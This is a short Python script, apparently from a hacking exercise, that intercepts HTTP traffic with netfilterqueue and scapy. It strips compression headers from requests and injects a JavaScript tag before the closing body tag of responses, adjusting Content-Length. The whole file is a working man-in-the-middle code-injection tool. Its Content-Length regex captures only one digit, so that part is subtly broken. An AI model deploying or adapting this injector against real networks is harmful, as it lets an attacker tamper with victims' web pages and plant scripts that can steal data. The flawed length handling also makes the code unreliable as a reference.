import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP Request")
            load = re.sub(b"Accept-Encoding:.*?\\r\\n",b"", load)
            
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            injection_code = b"<script>alert('hacked!')</script>"            
            load = load.replace(b"</body>", injection_code + b"</body>")
            content_length_search = re.search(b"(?:Content-Length:\s)(\d)*", load)
            
            if content_length_search:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                new_content_length= b"%d" %(new_content_length)
                load = load.replace(content_length, new_content_length)       
            
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))      
    packet.accept()
       
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()